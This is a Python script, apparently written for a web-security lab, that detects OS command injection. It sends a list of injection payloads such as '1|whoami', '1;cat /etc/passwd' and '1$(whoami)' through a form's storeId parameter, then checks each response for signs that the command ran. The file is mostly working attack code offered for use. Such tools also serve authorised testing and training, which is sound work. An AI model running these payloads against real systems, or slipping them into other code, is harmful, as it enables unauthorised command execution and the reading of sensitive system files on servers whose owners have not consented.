import requests
from bs4 import BeautifulSoup

# Define a list of payloads for visible OS command injection
visible_payloads = [
    '1|whoami',
    '1|id',
    '1|uname -a',
    '1;whoami',
    '1;id',
    '1;uname -a',
    '1&&whoami',
    '1&&id',
    '1&&uname -a',
    '1`whoami`',
    '1$(whoami)',
    '1;cat /etc/passwd',
    '1|cat /etc/passwd',
    '1&&cat /etc/passwd',
    '1|ls',
    '1;ls',
    '1&&ls',
]

def find_form_action_and_params(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')
    for form in forms:
        action = form.get('action')
        inputs = form.find_all('input')
        params = {input_tag.get('name'): input_tag.get('value', '') for input_tag in inputs if input_tag.get('name')}
        if action and params:
            return action, params
    return None, None

def test_visible_injection(url, method, action, initial_params, payloads):
    full_url = url + action
    for payload in payloads:
        params = initial_params.copy()
        # Assuming we need to inject in storeId, if another parameter is needed, adjust accordingly
        params['storeId'] = payload
        if method == 'POST':
            response = requests.post(full_url, data=params)
        else:
            response = requests.get(full_url, params=params)
        if response.status_code == 200:
            response_text = response.text.lower()
            if any(keyword in response_text for keyword in ['root', 'uid=', 'linux', 'bin/', 'daemon', 'sys']):
                return f'[+] Visible Injection Detected with payload: {payload}'
    return 'No OS command injection vulnerabilities detected.'

def scan_os_command_injection(url):
    action, initial_params = find_form_action_and_params(url)
    
    if action is None or initial_params is None:
        # Manually set the endpoint and parameters if form detection fails
        action = 'product/stock'
        initial_params = {'productId': '1', 'storeId': ''}
    
    # Test both POST and GET methods
    result = test_visible_injection(url, 'POST', action, initial_params, visible_payloads)
    if 'No OS' in result:
        result = test_visible_injection(url, 'GET', action, initial_params, visible_payloads)
    return result

if __name__ == '__main__':
    user_url = input('Enter the URL to test for OS command injection: ')
    result = scan_os_command_injection(user_url)
    print(result)
